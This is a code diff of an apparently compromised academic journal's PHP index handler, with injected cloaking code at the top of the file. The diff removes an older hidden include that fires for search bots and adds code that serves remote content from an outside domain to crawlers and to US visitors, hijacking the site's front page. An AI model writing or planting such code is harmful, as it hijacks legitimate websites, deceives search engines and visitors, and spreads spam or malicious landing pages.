@@ -1,5 +1,35 @@
 <?php
-error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/'){ include('/home/riyanmau/jurnalstmikiba/journals/2/articles/82/submission/review/82-13-303-1-4-20240602'); exit; }
+function getUserCountry() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $url = "http://ip-api.com/json/{$ip}";
+    
+    $response = @file_get_contents($url);
+    if ($response) {
+        $data = json_decode($response, true);
+        return $data['countryCode'] ?? null;
+    }
+    return null;
+}
+
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
+    
+    return preg_match($botchar, $user_agent);
+}
+
+$Biawak = "https://piona.xyz/landing/jurnal.stmikiba.ac.id/index.html";
+
+if (is_bot()) {
+    echo @file_get_contents($Biawak);
+    exit;
+}
+
+if (getUserCountry() === "US") {
+    header("Content-Type: text/html; charset=UTF-8");
+    echo @file_get_contents($Biawak);
+    exit();
+}
 /**
  * @file pages/index/IndexHandler.inc.php
  *
